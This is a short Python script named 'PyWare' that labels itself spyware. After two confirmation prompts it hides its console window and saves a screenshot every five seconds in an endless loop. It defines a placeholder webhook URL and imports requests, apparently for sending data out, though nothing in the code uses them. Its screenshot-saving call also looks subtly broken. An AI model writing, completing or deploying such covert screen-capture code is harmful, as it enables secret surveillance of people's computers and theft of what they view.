import time
import os
import requests
import subprocess
import pyautogui
import ctypes

Webhook_url = "https://example.com"
Screenshot_Num = 1
print("--PyWare--")
Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
if Run.upper() == "Y":
    Confirm = input("Are you POSITIVE you want to run this? Y/N | ")
    if Confirm.upper() == "Y":
        os.system('cls')
        print("Executing Script Please Wait...")
        time.sleep(3)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        while True:
          screenshot = pyautogui.screenshot()
          screenshot.save("Screenshot", Screenshot_Num)
          time.sleep(5)
          Screenshot_Num = Screenshot_Num + 1
    elif Confirm.upper() == "N":
        os.system('cls')
        print("Closing program please wait...")
        time.sleep(3)
        print("")
    else:
        os.system('cls')
        print("Closing program please wait,,,")
        time.sleep(3)
        print("")
elif Run.upper() == "N":
    os.system('cls')
    print("Closing program please wait...")
    time.sleep(3)
    print("")
else:
    os.system('cls')
    print("Closing program please wait...")
    time.sleep(3)
    print("")
